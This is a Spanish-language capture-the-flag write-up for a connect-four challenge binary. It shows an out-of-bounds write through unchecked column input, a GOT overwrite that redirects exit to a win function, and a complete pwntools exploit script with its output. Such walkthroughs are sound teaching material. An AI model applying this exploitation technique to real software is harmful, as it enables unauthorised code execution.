---
title: "4enRaya"
date: "2025-10-17"
tags: ["NavajaNegra", "OOB", "got"]
---

En este ejercicio nos dan un binario que hace lo siguiente:

```c
󰣇 PWN/nn/4enraya ❯ ./4enraya                                                                        
Enter player 1 symbol > W
Enter player 2 symbol > S
Player 1 choose your column (0-7) > 4

  0 1 2 3 4 5 6 7
 +---------------+
7|                |
6|                |
5|                |
4|                |
3|                |
2|                |
1|                |
0|        W       |
 +---------------+

Presiona 'q' para salir (exit), 'e' para llamar exit directamente, otra tecla para continuar: 
```

Es un 4 en raya en donde nos dejan escoger el símbolo que aparece en la cuadrícula y su posición. Vamos a ver cómo se recoge eso:

```c
    if (uStack_2c == 0) {
        uStack_9 = obj.player2symbol;
        sym.imp.printf("Player 2 choose your column (0-7) > ");
        puVar1 = &stack0xffffffffffffffc8;
    }
    else {
        uStack_9 = obj.player1symbol;
        sym.imp.printf("Player 1 choose your column (0-7) > ");
        puVar1 = &stack0xffffffffffffffc8;
    }
    *(puVar1 + -8) = 0x403a54;
    cStack_15 = sym.imp.getchar();
    puVar2 = puVar1;
    *(puVar1 + -8) = 0x403a5c;
    sym.imp.getchar();
    iStack_1c = cStack_15 + -0x30;
```

Aquí están pasando muchas cosas pero lo que nos queda claro es que parece ser que nuestro input se guarda en la variable `cStack_15`. Como está recogiendo nuestro input con un `getchar()`, si introducimos un "5" por ejemplo, se guardará como 0x35; entonces, luego le resta `0x30` a nuestro input para que en `iStack_1c` se guarde correctamente como decimal nuestro input. Entonces controlamos dónde se escribe un byte de nuestra elección en un lugar de nuestra elección. Parece que no hay restricciones de valores negativos, así que vamos a mirar su funcionamiento y si podemos escribir Out-of-Bounds. Para poder saber dónde mirar en memoria y comprobarlo podemos intentar buscar si el binario tiene algún nombre de variable, por ejemplo `tablero`, donde esté la dirección del inicio del tablero:

```c
[0x00403130]> is
[Symbols]
. . .
42  0x00003060 0x00406060 GLOBAL OBJ    64       board // Efectivamente
. . .
```

```c
Enter player 1 symbol > W
Enter player 2 symbol > X
Player 1 choose your column (0-7) > $

  0 1 2 3 4 5 6 7
 +---------------+
7|                |
6|                |
5|                |
4|                |
3|                |
2|                |
1|                |
0|                |
 +---------------+

pwndbg> x &board
0x406060 <board>:	0x20202020
pwndbg> dq 0x406060-0x20 
0000000000406040     0000000000000000 0000000000000000
0000000000406050     0000005700000000 0000000000000000
0000000000406060     2020202020202020 2020202020202020
0000000000406070     2020202020202020 2020202020202020
```

He puesto como posición `$` ya que en la tabla ASCII está un poco antes que los números, así que debería ponerse en una anterior al tablero y, efectivamente, ha funcionado. ¿Ahora que sabemos esto, qué queremos sobrescribir y qué queremos lograr?

El programa vuelve a tener una función win, podemos comprobar esto con `radare2` o `pwndbg`:

```c
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000403000  _init
0x00000000004030b0  putchar@plt
0x00000000004030c0  puts@plt
0x00000000004030d0  setbuf@plt
0x00000000004030e0  system@plt
0x00000000004030f0  printf@plt
0x0000000000403100  getchar@plt
0x0000000000403110  setvbuf@plt
0x0000000000403120  exit@plt
0x0000000000403130  _start
0x0000000000403160  _dl_relocate_static_pie
0x0000000000403170  deregister_tm_clones
0x00000000004031a0  register_tm_clones
0x00000000004031e0  __do_global_dtors_aux
0x0000000000403210  frame_dummy
0x0000000000403216  gadget
0x0000000000403221  banner
0x000000000040335d  win // Aquí
0x0000000000403377  setup
0x00000000004033c8  print_board
0x0000000000403485  prepare_game
0x00000000004034d8  check_winner
0x00000000004039fa  play_turn
0x0000000000403c8a  navaja
0x0000000000403ca9  main
0x0000000000403dd0  mallocc
0x0000000000403ddc  _fini
```

```c
r2 -A 4enraya  
[0x00403130]> afl
0x004030b0    1     10 sym.imp.putchar
0x004030c0    1     10 sym.imp.puts
0x004030d0    1     10 sym.imp.setbuf
0x004030e0    1     10 sym.imp.system
0x004030f0    1     10 sym.imp.printf
0x00403100    1     10 sym.imp.getchar
0x00403110    1     10 sym.imp.setvbuf
0x00403120    1     10 sym.imp.exit
0x00403130    1     37 entry0
0x00403170    4     31 sym.deregister_tm_clones
0x004031a0    4     49 sym.register_tm_clones
0x004031e0    3     32 entry.fini0
0x00403210    1      6 entry.init0
0x00403dd0    1     11 sym.mallocc
0x00403485    1     83 sym.prepare_game
0x00403ddc    1     13 sym._fini
0x004033c8    7    189 sym.print_board
0x00403216    1     11 sym.gadget
0x00403221    1    316 sym.banner
0x0040335d    1     26 sym.win // Aquí
0x00403160    1      5 sym._dl_relocate_static_pie
0x00403ca9   14    295 main
0x004034d8   46   1314 sym.check_winner
0x00403c8a    1     31 sym.navaja
0x00403000    3     27 sym._init
0x00403377    1     81 sym.setup
0x004039fa   22    656 sym.play_turn
```

Así que, de alguna manera, tenemos que mandar el programa a `win`. Una forma de hacer esto es cambiar una entrada del GOT que se use en el programa por la de la función `win`. El programa da una pista con esta línea:

```c
Presiona 'q' para salir (exit), 'e' para llamar exit directamente, otra tecla para continuar:
```

Podemos intentar cambiar el `exit()` por `win()`. Para eso solo necesitamos saber la distancia y los valores que necesitamos:

```c
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/ub1cu0/Escritorio/PWN/nn/4enraya/4enraya:
GOT protection: Partial RELRO | Found 8 GOT entries passing the filter
[0x406000] putchar@GLIBC_2.2.5 -> 0x403030 ◂— endbr64 
[0x406008] puts@GLIBC_2.2.5 -> 0x7ffff7c82c80 (puts) ◂— endbr64 
[0x406010] setbuf@GLIBC_2.2.5 -> 0x7ffff7c8a820 (setbuf) ◂— endbr64 
[0x406018] system@GLIBC_2.2.5 -> 0x403060 ◂— endbr64 
[0x406020] printf@GLIBC_2.2.5 -> 0x7ffff7c5ab00 (printf) ◂— endbr64 
[0x406028] getchar@GLIBC_2.2.5 -> 0x7ffff7c8a190 (getchar) ◂— endbr64 
[0x406030] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c83520 (setvbuf) ◂— endbr64 
[0x406038] exit@GLIBC_2.2.5 -> 0x4030a0 ◂— endbr64 

pwndbg> x &board
0x406060 <board>:	0x20202020

pwndbg> x 0x406060 - 0x406038
0x28:	Cannot access memory at address 0x28

pwndbg> x win
0x40335d <win>:	0xfa1e0ff3
```

Con esto sabemos que en `-0x28` empieza el puntero a `exit`. Con lo cual si conseguimos hacer lo siguiente:

* Cambiar el byte en la posición `-0x28` por `5d`
* Cambiar el byte en la posición `-0x27` por `33`

Cuando pongamos una "q" en el programa para salir se ejecutará la función `win` que printea la flag. Hagamos el exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./4enraya_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("challs.caliphalhounds.com", 32493)

def main():
    io = conn()

    got_exit = exe.got['exit']
    win = exe.sym['win']

    board_addr = exe.symbols['player1symbol']
    
    io.sendlineafter(b'Enter player 1 symbol > ', bytes([0x5d]))
    io.sendlineafter(b'Enter player 2 symbol > ', bytes([0x33]))
    io.sendlineafter(b'Player 1 choose your column (0-7) > ', bytes([0x08])) # 0x08 porque -0x28 + 0x30 = 0x08
    io.sendlineafter(b"Presiona 'q' para salir (exit), 'e' para llamar exit directamente, otra tecla para continuar: ", b"w")
    io.sendlineafter(b'Player 2 choose your column (0-7) > ', bytes([0x09]))
    io.sendlineafter(b"Presiona 'q' para salir (exit), 'e' para llamar exit directamente, otra tecla para continuar: ", b"e")

    print(hex(got_exit), hex(win), hex(board_addr))
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
python3 solve.py LOCAL                                                                                                                                                                                                     3.13.7  23:42 
[*] '/home/ub1cu0/Escritorio/PWN/nn/4enraya/4enraya_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x402000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/nn/4enraya/4enraya_patched': pid 13514
0x406038 0x40335d 0x4060c9
[*] Switching to interactive mode
Llamando a exit()...
$ whoami
ub1cu0
$  
```

¡Funciona! ¡Gracias por leer!
